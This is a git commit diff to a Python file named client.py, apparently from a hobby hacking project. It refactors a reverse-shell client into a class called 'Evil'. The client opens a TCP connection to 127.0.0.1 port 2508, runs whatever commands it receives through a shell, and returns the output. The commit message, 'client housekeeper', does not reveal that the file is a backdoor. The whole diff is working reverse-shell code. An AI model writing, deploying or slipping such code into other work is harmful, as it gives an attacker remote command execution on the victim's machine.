bd95b4d0889acf406c6f04e858d805c0f8e83647
devinflydrop <psynoxzhio@rmutsvmail.com>
2018-07-28 10:35:13 +0700

    update gitignore and client housekeeper

--- client.py
+++ client.py
@@ -8,18 +8,29 @@ import socket
 import subprocess
 
 
-def exec_sys_cmd(cmd):
-    return subprocess.check_output(cmd,shell=True)
+class Evil:
+    def __init__(self,ip,port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        self.connection.send("\n[+] connection established.\n")
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("127.0.0.1",2508))
+    def exec_sys_cmd(self,cmd):
+        return subprocess.check_output(cmd,shell=True)
 
-connection.send("\n[+] connection established.\n")
-while True:
-    cmd = connection.recv(1024)
-    cmd_result = exec_sys_cmd(cmd)
-    connection.send(cmd_result)
+    def run(self):
+        while True:
+            try:
+                cmd = self.connection.recv(1024)
+                cmd_result = self.exec_sys_cmd(cmd)
+                if not cmd_result:
+                    self.connection.send("System command exception")
+                    continue
+                self.connection.send(cmd_result)
+            except Exception:
+                self.connection.send("Something wrong...")
+                continue
 
+        self.connection.close()
 
-
-connection.close()
+evil = Evil("127.0.0.1",2508)
+evil.run()
